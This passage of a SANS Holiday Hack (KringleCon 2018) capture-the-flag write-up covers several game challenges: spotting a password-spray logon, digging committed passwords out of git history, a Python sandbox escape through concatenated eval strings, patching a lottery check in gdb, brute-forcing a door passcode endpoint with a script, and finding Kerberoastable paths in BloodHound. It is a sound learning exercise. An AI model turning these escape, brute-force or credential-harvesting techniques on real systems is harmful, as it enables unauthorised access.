+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.johnson&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.jones&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.lee&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.miller&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.smith&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.taylor&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.williams&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.wilson&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michelle.smith&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mike.brown&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mike.johnson&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mike.jones&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mike.miller&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mike.smith&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mike.williams&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;Data Name=&quot;TargetUserName&quot;&gt;minty.candycane&lt;/Data&gt;
+...(snip)...
+</div></code></pre>
+<p>Details of the log.</p>
+<pre class="hljs"><code><div>&lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;/EventID&gt;
+...(snip)...
+&lt;Data Name=&quot;TargetUserName&quot;&gt;minty.candycane&lt;/Data&gt;
+...(snip)...
+&lt;Data Name=&quot;IpAddress&quot;&gt;172.31.254.101&lt;/Data&gt;
+&lt;Data Name=&quot;IpPort&quot;&gt;38283&lt;/Data&gt;
+</div></code></pre>
+<p><code>minty.candycane</code> may be compromised by <code>172.31.254.101:38283</code>.</p>
+<h3 id="dev-ops-fail">Dev Ops Fail</h3>
+<p><code>Find Sparkle's password</code></p>
+<p>Find the password committed in the past from the git repository.</p>
+<pre class="hljs"><code><div>elf@dd635505040e:~$ cd kcconfmgmt
+
+elf@dd635505040e:~/kcconfmgmt$ git log | grep password -B 4
+commit d84b728c7d9cf7f9bafc5efb9978cd0e3122283d
+Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
+Date:   Sat Nov 10 19:51:52 2018 -0500
+
+    Add user model for authentication, bcrypt password storage
+--
+commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
+Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
+Date:   Thu Nov 8 21:11:03 2018 -0500
+
+    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use
+</div></code></pre>
+<p>It is written as <code>removed username/password from config.js</code> in a commit message.
+The commit message shows that <code>config.js</code> contained username and password.</p>
+<pre class="hljs"><code><div>elf@dd635505040e:~/kcconfmgmt$ git show 60a2ffea7520ee980a5fc60177ff4d0633f2516b
+commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
+Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
+Date:   Thu Nov 8 21:11:03 2018 -0500
+
+    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def 
+need to be updated before use
+
+diff --git a/server/config/config.js b/server/config/config.js
+deleted file mode 100644
+index 25be269..0000000
+<span class="hljs-comment">--- a/server/config/config.js</span>
+<span class="hljs-comment">+++ /dev/null</span>
+<span class="hljs-meta">@@ -1,4 +0,0 @@</span>
+<span class="hljs-deletion">-// Database URL</span>
+<span class="hljs-deletion">-module.exports = {</span>
+<span class="hljs-deletion">-    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'</span>
+<span class="hljs-deletion">-};</span>
+diff --git a/server/config/config.js.def b/server/config/config.js.def
+new file mode 100644
+index 0000000..740eba5
+<span class="hljs-comment">--- /dev/null</span>
+<span class="hljs-comment">+++ b/server/config/config.js.def</span>
+<span class="hljs-meta">@@ -0,0 +1,4 @@</span>
+<span class="hljs-addition">+// Database URL</span>
+<span class="hljs-addition">+module.exports = {</span>
+<span class="hljs-addition">+    'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'</span>
+<span class="hljs-addition">+};</span>
+</div></code></pre>
+<p>So Sparkle's password is <code>twinkletwinkletwinkle</code> and username is <code>sredberry</code>.</p>
+<h3 id="python-escape-from">Python Escape from</h3>
+<p><code>run ./i_escaped</code></p>
+<pre class="hljs"><code><div><span class="hljs-meta">&gt;&gt;&gt; </span>os = eval(<span class="hljs-string">'__im'</span> + <span class="hljs-string">'port__("os")'</span>)
+<span class="hljs-meta">&gt;&gt;&gt; </span>eval(<span class="hljs-string">'os.sys'</span>+<span class="hljs-string">'tem("./i_escaped")'</span>)
+</div></code></pre>
+<h3 id="the-sleighbell">The Sleighbell</h3>
+<p><code>Winning the sleighbell lottery for Shinny Upatree.</code></p>
+<pre class="hljs"><code><div>elf@a3148ac3c82b:~$ ./sleighbell-lotto 
+
+The winning ticket is number 1225.
+Rolling the tumblers to see what number you'll draw...
+
+You drew ticket number 996!
+
+Sorry - better luck next year!
+</div></code></pre>
+<p>First, Disassemble the program.</p>
+<pre class="hljs"><code><div>elf@a3148ac3c82b:~$ objdump -d -M intel sleighbell-lotto | grep '&lt;main&gt;:' -A57
+00000000000014ca &lt;main&gt;:
+    14ca:       55                      push   rbp
+    14cb:       48 89 e5                mov    rbp,rsp
+    14ce:       48 83 ec 10             sub    rsp,0x10
+    14d2:       48 8d 3d d6 56 00 00    lea    rdi,[rip+0x56d6]        # 6baf &lt;_IO_stdin_used+0x557f&gt;
+    14d9:       e8 92 f4 ff ff          call   970 &lt;getenv@plt&gt;
+    14de:       48 85 c0                test   rax,rax
+    14e1:       75 16                   jne    14f9 &lt;main+0x2f&gt;
+    14e3:       48 8d 3d d6 56 00 00    lea    rdi,[rip+0x56d6]        # 6bc0 &lt;_IO_stdin_used+0x5590&gt;
+    14ea:       e8 21 f4 ff ff          call   910 &lt;puts@plt&gt;
+    14ef:       bf ff ff ff ff          mov    edi,0xffffffff
+    14f4:       e8 27 f4 ff ff          call   920 &lt;exit@plt&gt;
+    14f9:       bf 00 00 00 00          mov    edi,0x0
+    14fe:       e8 dd f4 ff ff          call   9e0 &lt;time@plt&gt;
+    1503:       89 c7                   mov    edi,eax
+    1505:       e8 96 f4 ff ff          call   9a0 &lt;srand@plt&gt;
+    150a:       48 8d 3d 3f 58 00 00    lea    rdi,[rip+0x583f]        # 6d50 &lt;_IO_stdin_used+0x5720&gt;
+    1511:       e8 fa f3 ff ff          call   910 &lt;puts@plt&gt;
+    1516:       bf 01 00 00 00          mov    edi,0x1
+    151b:       e8 40 f4 ff ff          call   960 &lt;sleep@plt&gt;
+    1520:       e8 9b f4 ff ff          call   9c0 &lt;rand@plt&gt;
+    1525:       89 c1                   mov    ecx,eax
+    1527:       ba ad 8b db 68          mov    edx,0x68db8bad
+    152c:       89 c8                   mov    eax,ecx
+    152e:       f7 ea                   imul   edx
+    1530:       c1 fa 0c                sar    edx,0xc
+    1533:       89 c8                   mov    eax,ecx
+    1535:       c1 f8 1f                sar    eax,0x1f
+    1538:       29 c2                   sub    edx,eax
+    153a:       89 d0                   mov    eax,edx
+    153c:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
+    153f:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
+    1542:       69 c0 10 27 00 00       imul   eax,eax,0x2710
+    1548:       29 c1                   sub    ecx,eax
+    154a:       89 c8                   mov    eax,ecx
+    154c:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
+    154f:       48 8d 3d 56 58 00 00    lea    rdi,[rip+0x5856]        # 6dac &lt;_IO_stdin_used+0x577c&gt;
+    1556:       b8 00 00 00 00          mov    eax,0x0
+    155b:       e8 90 f3 ff ff          call   8f0 &lt;printf@plt&gt;
+    1560:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
+    1563:       89 c6                   mov    esi,eax
+    1565:       48 8d 3d 58 58 00 00    lea    rdi,[rip+0x5858]        # 6dc4 &lt;_IO_stdin_used+0x5794&gt;
+    156c:       b8 00 00 00 00          mov    eax,0x0
+    1571:       e8 7a f3 ff ff          call   8f0 &lt;printf@plt&gt;    
+    1576:       48 8d 3d 4a 58 00 00    lea    rdi,[rip+0x584a]        # 6dc7 &lt;_IO_stdin_used+0x5797&gt;
+    157d:       e8 8e f3 ff ff          call   910 &lt;puts@plt&gt;
+    1582:       81 7d fc c9 04 00 00    cmp    DWORD PTR [rbp-0x4],0x4c9
+    1589:       75 0c                   jne    1597 &lt;main+0xcd&gt;
+    158b:       b8 00 00 00 00          mov    eax,0x0
+    1590:       e8 42 fa ff ff          call   fd7 &lt;winnerwinner&gt;
+    1595:       eb 0a                   jmp    15a1 &lt;main+0xd7&gt;
+    1597:       b8 00 00 00 00          mov    eax,0x0
+    159c:       e8 16 ff ff ff          call   14b7 &lt;sorry&gt;
+    15a1:       bf 00 00 00 00          mov    edi,0x0
+    15a6:       e8 75 f3 ff ff          call   920 &lt;exit@plt&gt;
+    15ab:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
+</div></code></pre>
+<p>Solution 1: call winnerwinner func directly</p>
+<pre class="hljs"><code><div>elf@1ccb9a1a30e7:~$ gdb ./sleighbell-lotto -q
+Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
+(gdb) start
+Temporary breakpoint 1 at 0x14ce
+Starting program: /home/elf/sleighbell-lotto 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+
+Temporary breakpoint 1, 0x00005555555554ce in main ()
+(gdb) jump winnerwinner 
+Continuing at 0x555555554fdb.
+
+                                                                                
+                                                     .....          ......      
+                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
+                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
+                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
+                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
+                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
+                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
+              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
+            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
+           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
+           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
+          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
+       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
+     ...................,',,:lxkkkkkkkkkkkkkd.                                  
+     ..........................';;:coxkkkkk:                                    
+        ...............................ckd.                                     
+          ...............................                                       
+                ...........................                                     
+                   .......................                                      
+                              ....... ...                                       
+
+With gdb you fixed the race.
+The other elves we did out-pace.
+  And now they'll see.
+  They'll all watch me.
+I'll hang the bells on Santa's sleigh!
+
+
+Congratulations! You've won, and have successfully completed this challenge.
+[Inferior 1 (process 32) exited normally]s
+</div></code></pre>
+<p>Solution 2: modify local variable right before value compared.</p>
+<pre class="hljs"><code><div>elf@1ccb9a1a30e7:~$ gdb ./sleighbell-lotto -q
+Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
+(gdb) start
+Temporary breakpoint 1 at 0x14ce
+Starting program: /home/elf/sleighbell-lotto 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+
+Temporary breakpoint 1, 0x00005555555554ce in main ()
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x00005555555554ca &lt;+0&gt;:     push   %rbp
+   0x00005555555554cb &lt;+1&gt;:     mov    %rsp,%rbp
+=&gt; 0x00005555555554ce &lt;+4&gt;:     sub    $0x10,%rsp
+   0x00005555555554d2 &lt;+8&gt;:     lea    0x56d6(%rip),%rdi        # 0x55555555abaf
+   0x00005555555554d9 &lt;+15&gt;:    callq  0x555555554970 &lt;getenv@plt&gt;
+   0x00005555555554de &lt;+20&gt;:    test   %rax,%rax
+   0x00005555555554e1 &lt;+23&gt;:    jne    0x5555555554f9 &lt;main+47&gt;
+   0x00005555555554e3 &lt;+25&gt;:    lea    0x56d6(%rip),%rdi        # 0x55555555abc0
+   0x00005555555554ea &lt;+32&gt;:    callq  0x555555554910 &lt;puts@plt&gt;
+   0x00005555555554ef &lt;+37&gt;:    mov    $0xffffffff,%edi
+   0x00005555555554f4 &lt;+42&gt;:    callq  0x555555554920 &lt;exit@plt&gt;
+   0x00005555555554f9 &lt;+47&gt;:    mov    $0x0,%edi
+   0x00005555555554fe &lt;+52&gt;:    callq  0x5555555549e0 &lt;time@plt&gt;
+   0x0000555555555503 &lt;+57&gt;:    mov    %eax,%edi
+   0x0000555555555505 &lt;+59&gt;:    callq  0x5555555549a0 &lt;srand@plt&gt;
+   0x000055555555550a &lt;+64&gt;:    lea    0x583f(%rip),%rdi        # 0x55555555ad50
+   0x0000555555555511 &lt;+71&gt;:    callq  0x555555554910 &lt;puts@plt&gt;
+   0x0000555555555516 &lt;+76&gt;:    mov    $0x1,%edi
+   0x000055555555551b &lt;+81&gt;:    callq  0x555555554960 &lt;sleep@plt&gt;
+   0x0000555555555520 &lt;+86&gt;:    callq  0x5555555549c0 &lt;rand@plt&gt;
+   0x0000555555555525 &lt;+91&gt;:    mov    %eax,%ecx
+   0x0000555555555527 &lt;+93&gt;:    mov    $0x68db8bad,%edx
+   0x000055555555552c &lt;+98&gt;:    mov    %ecx,%eax
+   0x000055555555552e &lt;+100&gt;:   imul   %edx
+   0x0000555555555530 &lt;+102&gt;:   sar    $0xc,%edx
+   0x0000555555555533 &lt;+105&gt;:   mov    %ecx,%eax
+   0x0000555555555535 &lt;+107&gt;:   sar    $0x1f,%eax
+   0x0000555555555538 &lt;+110&gt;:   sub    %eax,%edx
+   0x000055555555553a &lt;+112&gt;:   mov    %edx,%eax
+   0x000055555555553c &lt;+114&gt;:   mov    %eax,-0x4(%rbp)
+   0x000055555555553f &lt;+117&gt;:   mov    -0x4(%rbp),%eax
+   0x0000555555555542 &lt;+120&gt;:   imul   $0x2710,%eax,%eax
+   0x0000555555555548 &lt;+126&gt;:   sub    %eax,%ecx
+   0x000055555555554a &lt;+128&gt;:   mov    %ecx,%eax
+   0x000055555555554c &lt;+130&gt;:   mov    %eax,-0x4(%rbp)
+   0x000055555555554f &lt;+133&gt;:   lea    0x5856(%rip),%rdi        # 0x55555555adac
+   0x0000555555555556 &lt;+140&gt;:   mov    $0x0,%eax
+   0x000055555555555b &lt;+145&gt;:   callq  0x5555555548f0 &lt;printf@plt&gt;
+   0x0000555555555560 &lt;+150&gt;:   mov    -0x4(%rbp),%eax
+   0x0000555555555563 &lt;+153&gt;:   mov    %eax,%esi
+   0x0000555555555565 &lt;+155&gt;:   lea    0x5858(%rip),%rdi        # 0x55555555adc4
+   0x000055555555556c &lt;+162&gt;:   mov    $0x0,%eax
+   0x0000555555555571 &lt;+167&gt;:   callq  0x5555555548f0 &lt;printf@plt&gt;
+   0x0000555555555576 &lt;+172&gt;:   lea    0x584a(%rip),%rdi        # 0x55555555adc7
+   0x000055555555557d &lt;+179&gt;:   callq  0x555555554910 &lt;puts@plt&gt;
+   0x0000555555555582 &lt;+184&gt;:   cmpl   $0x4c9,-0x4(%rbp)
+   0x0000555555555589 &lt;+191&gt;:   jne    0x555555555597 &lt;main+205&gt;
+   0x000055555555558b &lt;+193&gt;:   mov    $0x0,%eax
+   0x0000555555555590 &lt;+198&gt;:   callq  0x555555554fd7 &lt;winnerwinner&gt;
+   0x0000555555555595 &lt;+203&gt;:   jmp    0x5555555555a1 &lt;main+215&gt;
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---q
+Quit
+(gdb) b *0x0000555555555582
+Breakpoint 2 at 0x555555555582
+(gdb) c
+Continuing.
+
+The winning ticket is number 1225.
+Rolling the tumblers to see what number you'll draw...
+
+You drew ticket number 5921!
+
+
+Breakpoint 2, 0x0000555555555582 in main ()
+(gdb) x/1x $rbp-4
+0x7fffffffe5fc: 0x00001721
+(gdb) set {int}0x7fffffffe5fc=0x000004c9
+(gdb) c
+Continuing.
+
+                                                                                
+                                                     .....          ......      
+                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
+                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
+                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
+                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
+                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
+                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
+              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
+            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
+           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
+           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
+          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
+       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
+     ...................,',,:lxkkkkkkkkkkkkkd.                                  
+     ..........................';;:coxkkkkk:                                    
+        ...............................ckd.                                     
+          ...............................                                       
+                ...........................                                     
+                   .......................                                      
+                              ....... ...                                       
+
+With gdb you fixed the race.
+The other elves we did out-pace.
+  And now they'll see.
+  They'll all watch me.
+I'll hang the bells on Santa's sleigh!
+
+
+Congratulations! You've won, and have successfully completed this challenge.
+[Inferior 1 (process 38) exited normally]
+</div></code></pre>
+<h2 id="questions">Questions</h2>
+<h3 id="1-orientation-challenge">1 : Orientation Challenge</h3>
+<p>Access to <code>Kringle History Kiosk</code>.</p>
+<p>Then web browser access to https://kringlecon.com/osint_challenge_windows.html?challenge=osint&amp;id=7ffd7b7f-2b84-48da-ab5d-eb69567eb1d1 .</p>
+<pre class="hljs"><code><div>Answer all questions correctly to get the secret phrase!
+Question 1
+In 2015, the Dosis siblings asked for help understanding what piece of their &quot;Gnome in Your Home&quot; toy?
+[*]Firmware
+[ ]Clothing
+[ ]Wireless adapter
+[ ]Flux capacitor
+
+Question 2
+In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?
+[ ]Elgnirk
+[*]ATNAS
+[ ]GITH
+[ ]Savvy, Inc
+
+Question 3
+In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?
+[ ]Tom-tom drums
+[ ]DNA on a mug of milk
+[ ]Cookie crumbs
+[*]Business card
+
+Question 4
+In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?
+[ ]Snozberry Pi
+[ ]Blueberry Pi
+[*]Cranberry Pi
+[ ]Elderberry Pi
+
+Question 5
+In 2017, the North Pole was being bombarded by giant objects. What were they?
+[ ]TCP packets
+[*]Snowballs
+[ ]misfit toys
+[ ]Candy cares
+
+Question 6
+In 2017, Sam the snowman needed help reassembling pages torn from what?
+[ ]The Bash man page
+[ ]Scrooge's payroll ledger
+[ ]System swap space
+[*]The Great Book
+</div></code></pre>
+<p>I got the secret phrase <code>Happy Trails</code>.</p>
+<h3 id="2-directory-bwosing">2 : Directory Bwosing</h3>
+<p><code>Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness</code></p>
+<p>Investigate the web site: https://cfp.kringlecastle.com/</p>
+<img src=img/02-01_Web_Top.PNG width=700px />
+<p>Click <code>CFP</code> in the upper right.</p>
+<img src=img/02-02_Web_cfp.PNG width=700px />
+<p>The URL path is changed to <code>/cfp/cfp.html</code>.
+Then I accessed the URL path to <code>/cfp/</code> aiming at Directory Browsing.</p>
+<img src=img/02-03_Web_Index_of.PNG width=700px />
+<p>There are two files.
+<code>rejected-talks.csv</code> is not linked from web page.</p>
+<img src=img/02-04_reject-talks.PNG width=700px />
+<p>I found the <code>John McClane</code> submitted the talk title <code>Data Loss for Rainbow Teams: A Path in the Darkness</code>.</p>
+<h3 id="3-de-bruijn-sequences">3 : de Bruijn Sequences</h3>
+<p><code>When you break into the speaker unpreparedness room, what does Morcel Nougat say?</code></p>
+<p>I need to unlock the door for the speaker unpreparedness room.</p>
+<img src=img/03-01_Door_Passcode.PNG width=700px />
+<p>First, choose from the left in order.
+As a result, it was displayed as <code>Incorrect guess.</code></p>
+<img src=img/03-02_Try-0123.PNG width=700px />
+<p>At the same time web access had occurred. (<code>i=0123</code>)</p>
+<p>https://doorpasscode.kringlecastle.com/checkpass.php?i=0123&amp;resourceId=6fd87b8b-6884-43f4-9709-78f65c30e481</p>
+<img src=img/03-03_DevTools_request-0123.PNG width=700px />
+<p>Next, choose from the right in order.</p>
+<img src=img/03-04_Try-3210.PNG width=700px />
+<p>The web access at that time is as follows (<code>i=3210</code>) :</p>
+<p>https://doorpasscode.kringlecastle.com/checkpass.php?i=3210&amp;resourceId=6fd87b8b-6884-43f4-9709-78f65c30e481</p>
+<img src=img/03-05_DevTools_request-3210.PNG width=700px />
+<p>The <code>i</code> parameter consists of <code>[0-3]{4}</code>.
+Therefore, its combination is 256 patterns.
+So I wrote the python script to find <code>success: true</code>.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> itertools
+
+nums = (<span class="hljs-string">"0"</span>, <span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>, <span class="hljs-string">"3"</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list(itertools.product(nums, repeat=<span class="hljs-number">4</span>)):
+    check = <span class="hljs-string">""</span>.join(i)
+    url  = <span class="hljs-string">'https://doorpasscode.kringlecastle.com/checkpass.php?i='</span>
+    url += check
+    url += <span class="hljs-string">'&amp;resourceId=6fd87b8b-6884-43f4-9709-78f65c30e481'</span>
+
+    response = requests.get(url)
+    <span class="hljs-keyword">print</span> (check, response.text)
+</div></code></pre>
+<p>I ran the python script.</p>
+<pre class="hljs"><code><div>&gt;python 03_door_passcode.py
+0000 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0001 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0002 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0003 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0010 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0011 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0012 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0013 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0020 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0021 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0022 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0023 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0030 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0031 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0032 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0033 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0100 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0101 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0102 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0103 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0110 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0111 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0112 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0113 {&quot;success&quot;:false,&quot;message&quot;:&quot;Incorrect guess.&quot;}
+0120 {&quot;success&quot;:true,&quot;resourceId&quot;:&quot;6fd87b8b-6884-43f4-9709-78f65c30e481&quot;,&quot;hash&quot;:&quot;f99d06c58fae5264977df8ebf5dea61bf93dc7df96d5da3afaa97455c17623c5&quot;,&quot;message&quot;:&quot;Correct guess!&quot;}
+</div></code></pre>
+<p>By entering the mark as the result obtained, the door opens.</p>
+<img src=img/03-06_Correct_guess.PNG width=700px />
+<p>When I enter the room, Morcel Nougat says &quot;<code>Welcome unprepared speaker!</code>&quot;.</p>
+<h3 id="4-data-repo-analysis">4 : Data Repo Analysis</h3>
+<p><code>Retrieve the encrypted ZIP file from the North Pole Git repository ( https://git.kringlecastle.com/Upatree/santas_castle_automation ) . What is the password to open this file?</code></p>
+<pre class="hljs"><code><div>root@kali~# git clone https://git.kringlecastle.com/Upatree/santas_castle_automation.git
+Cloning into 'santas_castle_automation'...
+remote: Enumerating objects: 949, done.
+remote: Counting objects: 100% (949/949), done.
+remote: Compressing objects: 100% (545/545), done.
+remote: Total 949 (delta 258), reused 879 (delta 205)
+Receiving objects: 100% (949/949), 4.27 MiB | 2.72 MiB/s, done.
+Resolving deltas: 100% (258/258), done.
+
+root@kali~# cd santas_castle_automation/
+
+root@kali~/santas_castle_automation# find . -name &quot;*.zip&quot;                        
+./schematics/ventilation_diagram.zip
+</div></code></pre>
+<p>I used <code>git-grep</code> and <code>git-rev-list</code> to search for the word <code>password</code>.</p>
+<pre class="hljs"><code><div>root@kali~/santas_castle_automation# git grep -i Password $(git rev-list --all) | awk -F: '{print $3}' |sort -u
+        f.puts &quot;exec ssh -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oKbdInteractiveAuthentication=no -oChallengeResponseAuthentication=no -oConnectTimeout=120 -i #{@resource.value(
+      args += [&quot;--ssh&quot;, &quot;ssh -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oKbdInteractiveAuthentication=no -oChallengeResponseAuthentication=no -i #{@resource.value(
+      args.push('--password', @resource.value(
+    desc &quot;HTTP Basic Auth password&quot;
+    if @resource.value(
+  newparam 
+* Protect all sensitive files with strong a password.
+Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!
+Hopefully this is the last time we have to change our password again until next Christmas. 
+If you find an old password 'neath folder or bush,
+Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
+Password = 'Yippee-ki-yay'
+password = 'pepper ministix'
+
+root@kali~/santas_castle_automation# unzip schematics/ventilation_diagram.zip
+Archive:  schematics/ventilation_diagram.zip
+   creating: ventilation_diagram/
+[schematics/ventilation_diagram.zip] ventilation_diagram/ventilation_diagram_2F.jpg password: pepper ministix
+password incorrect--reenter: Yippee-ki-yay
+  inflating: ventilation_diagram/ventilation_diagram_2F.jpg  
+  inflating: ventilation_diagram/ventilation_diagram_1F.jpg  
+</div></code></pre>
+<p>Then I found two passphrase, <code>Yippee-ki-yay</code> and <code>pepper ministix</code>.
+I tried each passphrase to unzip <code>ventilation_diagram.zip</code>.
+In the result, the password was <code>Yippee-ki-yay</code>.</p>
+<h3 id="5-ad-privilege-discovery">5 : AD Privilege Discovery</h3>
+<p><code>Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name?</code></p>
+<blockquote>
+<p>Hint: Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws.</p>
+</blockquote>
+<blockquote>
+<p>Hint: Bloodhound Tool From: Holly Evergreen</p>
+</blockquote>
+<img src=img/05-01_BloodHound.PNG width=700px />
+<p>Expand option in the upper left, and look at <code>Pre-Built Analytics Queries</code>.</p>
+<p><img src=img/05-02_Pre-Built_Analytics_Queries.PNG width=300px /><br /></p>
+<p>In the list, There is the query <code>Shortest Paths to Domain Admins from Kerberoastable Users</code>.</p>
+<img src=img/05-03_Shortest_Path_to_.PNG width=300px />
+<p>So I selected it.</p>
+<img src=img/05-04_Query_Result.PNG width=700px />
